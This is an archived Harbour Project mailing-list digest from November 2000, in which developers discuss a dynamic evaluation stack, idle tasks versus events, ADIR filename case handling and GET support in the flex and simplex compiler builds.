In-Reply-To: <000301c059ec$48d8de20$0f2aa8c0@fivetechs>
Message-ID: <000701c059ee$923e0340$0f2aa8c0@fivetechs>

static void hb_stackInit( void )
{
   long l;

   HB_TRACE(HB_TR_DEBUG, ("hb_stackInit()"));

   hb_stack.pItems = ( PHB_ITEM ) hb_xgrab( sizeof( PHB_ITEM ) *
STACK_INITHB_ITEMS );
                                                    ^^^^^^^^
   hb_stack.pBase  = hb_stack.pItems;
   hb_stack.pPos   = hb_stack.pItems;     /* points to the first stack item
*/
   hb_stack.wItems = STACK_INITHB_ITEMS;

   for( l = 0; l < STACK_INITHB_ITEM; l++ )   <<<<<<<<<
      hb_stack.pItems[ l ] = hb_xgrab( sizeof( HB_ITEM ) );  <<<<<<<<
}


Antonio


From harbour@lists.harbour-project.org  Wed Nov 29 05:30:03 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Wed Nov 29 05:30:03 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <000301c059ec$48d8de20$0f2aa8c0@fivetechs>
Message-ID: <000801c059ef$01b70000$0f2aa8c0@fivetechs>

/* stack managed by the virtual machine */
typedef struct
{
   PHB_ITEM * pItems;     /* pointer to the stack items */   <<<<<<<<<<<<
   PHB_ITEM pPos;         /* pointer to the latest used item */
   LONG     wItems;       /* total items that may be holded on the stack */
   HB_ITEM  Return;       /* latest returned value */
   PHB_ITEM pBase;        /* stack frame position for the current function
call */
   PHB_ITEM pEvalBase;    /* stack frame position for the evaluated
codeblock */
   int      iStatics;     /* statics base for the current function call */
   char     szDate[ 9 ];  /* last returned date from _pards() yyyymmdd
format */
} HB_STACK;


Antonio


From harbour@lists.harbour-project.org  Wed Nov 29 05:42:01 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Wed Nov 29 05:42:01 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011290540_MC2-BC7D-F7B0@compuserve.com>

Ryszard,

> My point remains: surely we want a good stack implementation.  One
> that doesn't move the stack around!  And as I just posted yesterday
> that should be stack_s_, being both Eval stack & CPU stack.

"Sorry, but what is a relation of CPU stack with the eval stack?"

Commonly they both grow at about the same rate.  (By observation of
Clipper apps.  It's just a guideline, not a rule. <g>)

"We are not managing any CPU stack so far."

Quite. :-(

"This work is left for C compiler. Do we have any missings here?"

Yes.  C runtimes commonly allocate a rather small stack.  However,
whatever size it is, it will _not_ [1] move around while an app runs,
so if it's not big enough the app will abort (or crash).  A more or
less unlimited Eval stack isn't likely to help if the CPU stack is
quite small.

[1] well, not with any C I can recall

John.

From harbour@lists.harbour-project.org  Wed Nov 29 05:45:03 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Wed Nov 29 05:45:03 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <000301c059ec$48d8de20$0f2aa8c0@fivetechs>
References: <000001c059ea$9f38e820$0f2aa8c0@fivetechs>
Message-ID: <3A24ED3D.27249.344F6DB@localhost>

On 29 Nov 2000, at 11:08, Antonio Linares wrote:

> Those HB_ITEMs will be reused, over and over,
> so there is no speed loss at all.

  These items have to be allocated somwhere. We can allocate a bigger 
chunks of memory but we will have to manage some kind of cache to 
speed allocations. This way we are returning to getGrip()/setGrip() 
issue. We can manage list of allocated items from which we will draw 
items returned by hb_itemNew() and a separate list of deallocated 
items that will be filled with hb_itemRelease().

Antonio - a very good shot :)

Regards, Ryszard

From harbour@lists.harbour-project.org  Wed Nov 29 05:59:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Wed Nov 29 05:59:02 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <000801c059ef$01b70000$0f2aa8c0@fivetechs>
References: <000301c059ec$48d8de20$0f2aa8c0@fivetechs>
Message-ID: <3A24EF5F.20698.E055CC@localhost>

Hi Antonio

Yes, very good idea, and most of all quite simple to implement.
I like it...

OTOH, I think there is a bug within the Dynamic symbol table 
implementation (but not within it's concept :-) ).

Do you plan to apply your idea within the stack ? Or anyone else ?
I'm currently working on the ::Class: ... implementation (based on 
some Luiz idea) but if nothing is done after that I can have a review 
of it. 

See you,


> /* stack managed by the virtual machine */
> typedef struct
> {
>    PHB_ITEM * pItems;     /* pointer to the stack items */  
>    <<<<<<<<<<<< PHB_ITEM pPos;         /* pointer to the latest used
>    item */ LONG     wItems;       /* total items that may be holded on
>    the stack */ HB_ITEM  Return;       /* latest returned value */
>    PHB_ITEM pBase;        /* stack frame position for the current
>    function
> call */
>    PHB_ITEM pEvalBase;    /* stack frame position for the evaluated
> codeblock */
>    int      iStatics;     /* statics base for the current function
>    call */ char     szDate[ 9 ];  /* last returned date from _pards()
>    yyyymmdd
> format */
> } HB_STACK;
> 
> 
> Antonio
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com



From harbour@lists.harbour-project.org  Wed Nov 29 06:12:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Wed Nov 29 06:12:02 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <3A24ED3D.27249.344F6DB@localhost>
Message-ID: <000a01c059f4$d0c77a00$0f2aa8c0@fivetechs>

We really need a few minor changes. Notice how easy
to fix hb_param!

PHB_ITEM hb_param( int iParam, int iMask )
{
   ...

   PHB_ITEM pItem = ( iParam == -1 ) ? &hb_stack.Return : ( *
 hb_stack.pBase + 1 +
   iParam ) );
   ...
}

Antonio



From harbour@lists.harbour-project.org  Wed Nov 29 06:48:01 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Wed Nov 29 06:48:01 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <3A24EF5F.20698.E055CC@localhost>
Message-ID: <001001c059f9$de9f8960$0f2aa8c0@fivetechs>

JF,

> Do you plan to apply your idea within the stack ? Or anyone else ?

I am currently reviewing all different Harbour systems to
see which of them may need to be changed.

As far as I see it, RTL functions should not change as
they work on a higher layer.

We may need to review VM files only, to see where the new
stack implementation may require some little changes.

All help is really welcome! :-)

Antonio

From harbour@lists.harbour-project.org  Wed Nov 29 06:58:03 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Wed Nov 29 06:58:03 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011290657_MC2-BC72-3D1C@compuserve.com>

Ryszard,

"We are developing a Clipper compatible compiler - not a GUI =

application."

I hope I haven't said otherwise.  However, I think we're also wanting
to allow GUI OSes.  INKEY and "idle" tasks run from it are not
suitable with GUI OSes.

"We are talking about differnt things currently. Idle tasks can be =

called when an _application_ have nothing more interesting to do."

Unfortuantely several of the examples do not match that description.

"Events and low-priority tasks called from VM loop have a quite =

different usage and cannot be mixed with idle tasks. However both =

should be implemented in a proper way."

It looks like if we had events/low-priority (whatever we call 'em)
tasks, we would no longer need "idle" tasks.  IIRC all the examples
would work as low-priority tasks - some of them better or at least
more predictably than they do as "idle" tasks.

"If I am not mistaken then only ,,GUI OSes'' offers messagess and
events to handle keystrokes"

They can easily be implemented as events inside Harbour.  Clipper does
it that way. :-)  Then INKEY (etc) turn them back from events!

"If we want to port old Clipper applications"

I'm taking it as long-since agreed that we do.

"Do you have a better solution for systems that don't offer such
keystroke handling?"

Follow Clipper's lead: use events internally.  All OSes can then be
modelled.

John.

From harbour@lists.harbour-project.org  Wed Nov 29 06:59:04 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Wed Nov 29 06:59:04 2000
Subject: [Harbour] adir compatibility
Message-ID: <200011290657_MC2-BC72-3D1B@compuserve.com>

Brian,

Dare I suggest a SET for it?

But on UNIX/Linux & many other OSes, changing the case would be a
big mistake because the file systems are case-sensitive. :-)

John.

From harbour@lists.harbour-project.org  Wed Nov 29 07:00:04 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Wed Nov 29 07:00:04 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011290657_MC2-BC72-3D1E@compuserve.com>

Phil,

> Not really.  I think the stack should _not_ move around, as it breaks
> the kind of code we already have and which any person adding code
> would normally write, including the kind of code that works with
> Clipper.

"Clippers dynamic memory allocation already subjects us to =

movable memory objects. Why is stack being indirected by one =

level any different?"

Clipper doesn't move either CPU or Eval stack.  It's easier to write
code knowing that, and many people have done.  Harbour doesn't need
to move the stacks.  So, let's not. :-)

OTOH, if it's just one extra level of indirection it sounds not too
bad.  What worries me is if already-written code will need to be
changed, because it looks like it will be very hard to find the parts
to change.  Er... I'm not talking about my code: C4W internals hardly
uses the Eval stack so I would have an easy task. :-)

John.

From harbour@lists.harbour-project.org  Wed Nov 29 07:01:07 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Wed Nov 29 07:01:07 2000
Subject: [Harbour] hello, April to earth...
Message-ID: <200011290657_MC2-BC72-3D1F@compuserve.com>

April,

I saw your posts.  I had nothing to say :-( so said nothing. :-)

IIRC you get some warnings when building Harbour.  So do I, but they
don't look worth worrying about; there are far more serious issues!

John.

From harbour@lists.harbour-project.org  Wed Nov 29 07:02:04 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Wed Nov 29 07:02:04 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011290657_MC2-BC72-3D1D@compuserve.com>

Ryszard,

"_GET_ support in flex version is not finished yet."

Oh. :-(

"Simplex support is not compatible with Clipper."

Looks OK to me.  Simplex _GET_ works as expected (so far).

"Clipper is not using a preprocessor to supply a set/get codeblock"

_GET_ is a very special (weird) case in Clipper.  As it is in Clipper,
an equivalent cannot be written using CH/PRG code.  Note that the PPO
file shows one thing but something else is in the OBJ.

"breaking a modularization - it is placed in Simplex, bison =

and preprocessor."

If there's a better structure, I'm all for it - but it still has to
work. :-)

"Flex solution is placed in the expression optimizer only."

But it doesn't work. :-(

Maybe allowing @ with more complicated things like array elements and
object expressions is a better way?

John.

From harbour@lists.harbour-project.org  Wed Nov 29 07:30:04 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Wed Nov 29 07:30:04 2000
Subject: [Harbour] hb_dynSymGet() GPFs in latest code
References: <3A24D45B.27640.2E3C2FE@localhost>
Message-ID: <3A24F6AC.D752321B@libero.it>

Ryszard,

I don't know, maybe my realloc() never shrinks a block but only enlarges
it. But I fixed my gpf with this initial big alloc. 

regards.


Ryszard Glab ha scritto:
> 
> On 28 Nov 2000, at 22:28, Maurilio Longo wrote:
> 
> > s_pDynItems = ( PDYNHB_ITEM ) hb_xgrab( sizeof( DYNHB_ITEM ) * 20000
> > );     /* Grab array */
> 
>   This shouldn't help much because this big memory block will be
> shrinked during inserting of second symbol
> (realloc( <symbols_count> * <size>))
> s_pDynitems is an array of pointers to dynamic symbols. Reallocation
> of this array doesn't change the value of pointers stored. Unless we
> are using somwhere a direct address of a pointer but I cannot locate
> any such code at this moment.
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Wed Nov 29 07:36:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Wed Nov 29 07:36:02 2000
Subject: [Harbour] adir compatibility
In-Reply-To: <200011290657_MC2-BC72-3D1B@compuserve.com>; from John_Skelton@compuserve.com on Wed, Nov 29, 2000 at 06:57:25AM -0500
References: <200011290657_MC2-BC72-3D1B@compuserve.com>
Message-ID: <20001129121707.A3685@hagbard.davep.org>

On Wed, Nov 29, 2000 at 06:57:25AM -0500, John Skelton wrote:
> Brian,
> 
> Dare I suggest a SET for it?
> 
> But on UNIX/Linux & many other OSes, changing the case would be a big
> mistake because the file systems are case-sensitive. :-)

[ObNitPick: Can be case-sensitive, I've got a case-insensitive filesystem
            mounted on hagbard]

FlagShip took this (a compatibility layer controlled by a run-time setting)
approach and it seemed sensible. I know I'm not the only one to have pointed
this out before.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Wed Nov 29 07:48:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Wed Nov 29 07:48:02 2000
Subject: [Harbour] easy solution for the dynamic stack
References: <001001c059f9$de9f8960$0f2aa8c0@fivetechs>
Message-ID: <3A24FB1B.86A39709@libero.it>

Antonio,

while you're at it, please consider multithreading issues, that is,
never export static variables but only callable functions. This way when
we will have multithreading it will be a lot easier to controll access
to these structures.

regards.


Antonio Linares ha scritto:
> 
> JF,
> 
> > Do you plan to apply your idea within the stack ? Or anyone else ?
> 
> I am currently reviewing all different Harbour systems to
> see which of them may need to be changed.
> 
> As far as I see it, RTL functions should not change as
> they work on a higher layer.
> 
> We may need to review VM files only, to see where the new
> stack implementation may require some little changes.
> 
> All help is really welcome! :-)
> 
> Antonio
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Wed Nov 29 08:34:02 2000
From: harbour@lists.harbour-project.org (=?big5?B?ufml1lwoU1MtQkJTXCk=?=)
Date: Wed Nov 29 08:34:02 2000
Subject: [Harbour] about Harbour for Palm??
References: <001001c059f9$de9f8960$0f2aa8c0@fivetechs> <3A24FB1B.86A39709@libero.it>
Message-ID: <006f01c05a08$7770e720$6c7ba8c0@ssprg>

Hello All!!

        Can I write Palm APP use Harbour ??



From harbour@lists.harbour-project.org  Wed Nov 29 09:54:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Wed Nov 29 09:54:02 2000
Subject: [Harbour] about Harbour for Palm??
In-Reply-To: <006f01c05a08$7770e720$6c7ba8c0@ssprg>; from ssbbs@mail2.zzz.com.tw on Wed, Nov 29, 2000 at 09:29:57PM +0800
References: <001001c059f9$de9f8960$0f2aa8c0@fivetechs> <3A24FB1B.86A39709@libero.it> <006f01c05a08$7770e720$6c7ba8c0@ssprg>
Message-ID: <20001129142435.D3685@hagbard.davep.org>

On Wed, Nov 29, 2000 at 09:29:57PM +0800, ¹ù¥Ö\(SS-BBS\) wrote:

>         Can I write Palm APP use Harbour ??

Nobody has contributed code to allow harbour to target PalmOS so, no, not at
the moment.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Wed Nov 29 10:18:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Wed Nov 29 10:18:02 2000
Subject: [Harbour] Flex and Simplex probl.
In-Reply-To: <20001129142435.D3685@hagbard.davep.org>
References: <006f01c05a08$7770e720$6c7ba8c0@ssprg>; from ssbbs@mail2.zzz.com.tw on Wed, Nov 29, 2000 at 09:29:57PM +0800
Message-ID: <3A252C02.26848.CA1E18@localhost>

Hi, (Ryszard, Ron)

Maybe I'm missing something but it seem the last GET, GETA 
implementation are not completely implemented within the FLEX 
version of harbour...

Also, just for Ron, it seem there is a problem with the simplex 
version of Harbour.

Some perfectly working program with Flex version crashed in some 
case where we use Self. Here is a partial copy of a mail from John 
Skelton. We have the two c code generated in case of needed.

Any Idea,

>>>>>>>> John's Message
 
Hi Jean,

I may know the diff. between flex & slex builds: the slex one uses
HB_P_PUSHSELF instead of HB_PUSHLOCALNEAR.  Maybe the 
internal SELF
isn't the right value.  Or, to put it another way, maybe the slex
Harbour is treating SELF more like a reserved keyword and that in
turn means C4W's way of using it needs to change to another 
name.

Now to find which CH thing(s) need to change, if that's so...

OK, first I'd be happy to find the _one_ (or few) to change, to see
if it makes the slex version work.

The diff. above is at line 224 in the C, which is line 33 of the PRG,
which is this line in CLASS BrowseApp:
	METHOD Create(cText)	INLINE ::oWnd := MainWindow{self, 
cText}

There are at least 2 things:
1. Harbour's SELF should actually be set correctly, so the code 
should
work
2. Maybe we can change the CH (but which line(s)?) until #1 
happens


Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com



From harbour@lists.harbour-project.org  Wed Nov 29 10:35:04 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Wed Nov 29 10:35:04 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas     <ron@profit-master.com>
In-Reply-To: <200011290657_MC2-BC72-3D1C@compuserve.com>
Message-ID: <3A25313A.6551.44E8C11@localhost>

On 29 Nov 2000, at 6:57, John Skelton wrote:

> I hope I haven't said otherwise.  However, I think we're also wanting
> to allow GUI OSes.  INKEY and "idle" tasks run from it are not
> suitable with GUI OSes.

  
> 
> "We are talking about differnt things currently. Idle tasks can be
> called when an _application_ have nothing more interesting to do."
> 
> Unfortuantely several of the examples do not match that description.

  I still don't understand why you want to limit the freedom of 
harbour usage for future users. If some feature can be very usable 
for someone then we can deliver this feature, especially if it costs 
us nothing. If idle tasks can be usable then we should deliver them. 

> It looks like if we had events/low-priority (whatever we call 'em)
> tasks, we would no longer need "idle" tasks.  IIRC all the examples
> would work as low-priority tasks - some of them better or at least
> more predictably than they do as "idle" tasks.

  Tasks called from the main VM loop will steel a time from the main 
flow of the application thus will cause some performance degradation. 
Idle tasks are called when an application waits for keystrokes thus 
is not running any real code. This means that their purpose is 
different. This means also that we should deliver both possibilities 
and we should leave the choice for harbour programmer. Since we have 
now an acceptable idle tasks handling then we can now move to 
,,events''.

> "If I am not mistaken then only ,,GUI OSes'' offers messagess and
> events to handle keystrokes"
> 
> They can easily be implemented as events inside Harbour.  Clipper does
> it that way. :-)  Then INKEY (etc) turn them back from events!

  Or from a different perspective: INKEY() can be used to implement 
an events at an application level.
  However you are right here. We can have a better implementation of 
INKEY(). Instead of low-level C function it should be a PRG code that 
will check if key or mouse was used. Something like:

//INKEYSYS.PRG
//not tested
FUNCTION INKEY( nSeconds )
LOCAL nKey, nStart, lForever

IF( nSeconds == NIL )
  RETURN hb_inkeyGet()
ELSE
 lForever := (nSeconds == 0)
 nStart :=SECONDS()
 DO WHILE( lForever )
  IF( (SECONDS()-nStart) > nSeconds .OR. (nKey:=hb_inkeyGet()) == 0 ))
   RETURN nKey
  ENDIF
 ENDDO
ENDIF

RETURN nKey

  This will give a chance to run 'events' and low priority tasks 
during the VM loop and will give a chance to implement idle tasks 
handling at the PRG level or any other INKEY() handling logic.
  Is this something that you are writing about?

Any other opinions?

Regards, Ryszard

From harbour@lists.harbour-project.org  Wed Nov 29 10:50:04 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Wed Nov 29 10:50:04 2000
Subject: [Harbour] Flex and Simplex probl.
In-Reply-To: <3A252C02.26848.CA1E18@localhost>
References: <20001129142435.D3685@hagbard.davep.org>
Message-ID: <3A2534C9.28980.45C7082@localhost>

On 29 Nov 2000, at 16:17, jflefebv@mafact.com wrote:

> Maybe I'm missing something but it seem the last GET, GETA 
> implementation are not completely implemented within the FLEX 
> version of harbour...

  Yes, it lacks support for editing an object variables 
(GET oObj:variable ). Also editing a usual variables is using a 
reference to a variable. This can cause some problems if generation 
of get objects are located in different function then READ invocation.
OK, I can finish it today.

Regards, Ryszard


From harbour@lists.harbour-project.org  Wed Nov 29 11:01:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 29 11:01:02 2000
Subject: [Harbour] Flex and Simplex probl.
In-Reply-To: <3A252C02.26848.CA1E18@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMELADHAA.ron@profit-master.com>

Jean F., John,

Any chance I could get the smallest sample to demonstrate the different C
output of SELF.

John, it may be as simple as just the PP output of the line in question.

Ron

> The diff. above is at line 224 in the C, which is line 33 of the PRG,
> which is this line in CLASS BrowseApp:
> 	METHOD Create(cText)	INLINE ::oWnd := MainWindow{self,
> cText}


From harbour@lists.harbour-project.org  Wed Nov 29 11:15:03 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Wed Nov 29 11:15:03 2000
Subject: [Harbour] Flex and Simplex probl.
In-Reply-To: <3A2534C9.28980.45C7082@localhost>
References: <3A252C02.26848.CA1E18@localhost>
Message-ID: <3A253944.8593.FDED3A@localhost>

Hi Ryszard,

> > Maybe I'm missing something but it seem the last GET, GETA 
> > implementation are not completely implemented within the FLEX 
> > version of harbour...
> 
>   Yes, it lacks support for editing an object variables 
> (GET oObj:variable ). Also editing a usual variables is using a 
> reference to a variable. This can cause some problems if generation of
> get objects are located in different function then READ invocation.
> OK, I can finish it today.

Many many thanks,

Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Wed Nov 29 11:33:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Wed Nov 29 11:33:02 2000
Subject: [Harbour] hello, April to earth...
In-Reply-To: <3A247F4C.8E270F6A@user.rose.com>
Message-ID: <200011291632.eATGWqr26067@thor.parrett.net>

** Reply to message from April <awhite@user.rose.com> on Tue, 28 Nov
2000 23:00:12 -0500

> - using djgpp with rsxntdj

I think that the lack of response to this subject indicates that nobody
else is using this combination. (For example, I use both DJGPP and
RSXNT, but have never attempted to use DJGPP with RSXNTDJ.)
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Wed Nov 29 11:35:05 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Wed Nov 29 11:35:05 2000
Subject: [Harbour] Flex and Simplex probl.
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMELADHAA.ron@profit-master.com>
References: <3A252C02.26848.CA1E18@localhost>
Message-ID: <3A253DE2.25648.10FF63E@localhost>

Hi Ron

I would prefer John decide to send it to you (or to the list) as it's 
some C4W 4.0 App.

> Jean F., John,
> 
> Any chance I could get the smallest sample to demonstrate the
> different C output of SELF.
> 
> John, it may be as simple as just the PP output of the line in
> question.
> 
> Ron
> 
> > The diff. above is at line 224 in the C, which is line 33 of the
> > PRG, which is this line in CLASS BrowseApp: 	METHOD
> > Create(cText)	INLINE ::oWnd := MainWindow{self, cText}
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Wed Nov 29 11:37:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Wed Nov 29 11:37:03 2000
Subject: [Harbour] hello, April to earth...
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKEEKLDHAA.ron@profit-master.com>
References: <3A247F4C.8E270F6A@user.rose.com>
Message-ID: <200011291636.eATGabr26550@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Tue,
28 Nov 2000 20:28:53 -0800

> I am not sure if every one received your messages, as it appears it was
> addressed to harbour@matrixlist.com instead of harbour@lists.harbour-project.org

Both of those addresses are for the same mailing list. But I can see
where some people may have ignored some messages in the deluge from
Thursday through Sunday... (I had 137 new messages to wade through on
Monday, most of which turned out to be a grudge match.)
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Wed Nov 29 11:42:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Wed Nov 29 11:42:02 2000
Subject: [Harbour] adir compatibility
In-Reply-To: <000f01c059df$c29cd110$8604d2cc@san.rr.com>
Message-ID: <200011291641.eATGfBr26937@thor.parrett.net>

** Reply to message from "Brian Hays" <bhays@abacuslaw.com> on Wed, 29
Nov 2000 00:38:34 -0800

> Should we force these to upper?

Considering that Un*x is case sensitive and lots of people use the
results of Directory() and ADIR() to actually access files and not just
to see if they exist, then no, we had better not force file names to
upper case by default.

> Should there be a switch/parameter added?

I think that a new SET value might be better. Something like
_SET_FILENAMEUC with a default of .F.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Wed Nov 29 12:26:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Wed Nov 29 12:26:02 2000
Subject: [Harbour] trapping .prg errors
In-Reply-To: <3A20007D.6372E5A@user.rose.com>
Message-ID: <200011291725.eATHPGr31607@thor.parrett.net>

** Reply to message from April <awhite@user.rose.com> on Sat, 25 Nov
2000 13:10:05 -0500

> While doing a full re-make, I saw a large block of warnings go by while
> a .prg was being compiled (I think I made some statement as to
> "unnecessary rules")
> ...
> Should I set PRG_USR to /es2 so that the make system stops?  Or does
> different values of /w[value] impact on this?

The /w[value] Harbour option just changes the amount of warnings that
will be reported, but if you want Harbour to stop when a warning is
reported, you have to use /es2. But if you are using the GNU Make
system, then that is already provided by default, which means that the
warnings may have been from the C compiler rather than from Harbour. To
make the C compiler stop when there are warnings, you would need to set
C_USR to the appropriate flag for the compiler that you are using.

> I re-make via:
> 
> @echo off
> make -r clean
> redir -e ..\results.err make -r
> if not errorlevel 2 redir -ea ..\results.err make -r
> 
> but the output of the harbour errors did not go to the results.err file.

I am not familiar with the redir utility. I normally use an extended
4NT batch file, which I just finished converting into a batch file that
works with both 4NT and CMD.EXE:

@echo off
if %1.==. goto bad
if %2.==CLEAN. make -r clean 1> %1.out 2> %1.err
if %2.==CLEAN. goto continue
if %2.==clean. make -r clean 1> %1.out 2> %1.err
:continue
make -r 1> %1.out 2>%1.err
wav C:\WINNT\phasers.wav
if not %_4VER%.==. list %1.err
if %_4VER%.==. type %1.err | more
goto exit
:bad
echo Syntax: MK output_redirection_file_name [CLEAN]
:exit

You'll end up with two files. For instance, if you call the batch file
using "mk2 rsxnt.mk clean", you end up with two redirected output files,
rsxnt.mk.out and rsxnt.mk.err, both of which only have the redirected
output from the actual make, which replaces the redirected output from
the clean. The three command line parameter tests for CLEAN are needed,
because CMD.EXE is case-sensitive, but 4NT is not.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Wed Nov 29 14:51:01 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Wed Nov 29 14:51:01 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <001001c059f9$de9f8960$0f2aa8c0@fivetechs>
References: <3A24EF5F.20698.E055CC@localhost>
Message-ID: <3A256D35.29940.538D766@localhost>

On 29 Nov 2000, at 12:45, Antonio Linares wrote:

> We may need to review VM files only, to see where the new
> stack implementation may require some little changes.

  The most common usage of stack is hvm.c, extend.c and debug.c
These files are accessing the eval stack quite often
A few references are in classes.c and some few other files.

Regards, Ryszard


From harbour@lists.harbour-project.org  Wed Nov 29 16:37:01 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Wed Nov 29 16:37:01 2000
Subject: [Harbour] adir compatibility
Message-ID: <006d01c05a4d$c7ae3b80$59f6fbce@local>

Perhaps the HARBOUR_STRICT_CLIPPER_COMPATIBILITY flag should control this?
If set, Directory() should force to upper before returning?

----- Original Message -----
From: Dave Pearson <davep@davep.org>
To: <harbour@lists.harbour-project.org>
Sent: Wednesday, November 29, 2000 4:17 AM
Subject: Re: [Harbour] adir compatibility


> On Wed, Nov 29, 2000 at 06:57:25AM -0500, John Skelton wrote:
> > Brian,
> >
> > Dare I suggest a SET for it?
> >
> > But on UNIX/Linux & many other OSes, changing the case would be a big
> > mistake because the file systems are case-sensitive. :-)
>
> [ObNitPick: Can be case-sensitive, I've got a case-insensitive filesystem
>             mounted on hagbard]
>
> FlagShip took this (a compatibility layer controlled by a run-time
setting)
> approach and it seemed sensible. I know I'm not the only one to have
pointed
> this out before.
>




From harbour@lists.harbour-project.org  Wed Nov 29 16:59:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 29 16:59:01 2000
Subject: [Harbour] 2000-11-29 13:50 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <200011291641.eATGfBr26937@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIELDDHAA.ron@profit-master.com>

2000-11-29 13:50 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/compiler/harbour.c
     * Exported: hb_compFieldGetPos() and hb_compMemvarGetPos()

   * source/compiler/harbour.sly
     ! Changed __GET() support to be parameter compatible with Clipper

   * include/hberrors.h
   * source/compiler/hbgenerr.c
     + Added Error: "GET contains complex macro"

   * source/pp/pptable.c
     - Removed bSetGet from rule of GET, PP output now Clipper compatible.

   * source/vm/memvars.c
     + Added HB_FUNC( __ISMV ) // Return .T. if passed string is a Memory
Variable.

   * source/rtl/tgetint.prg
     ! Fixed __GET() to be 100% parameter compatible with Clipper.
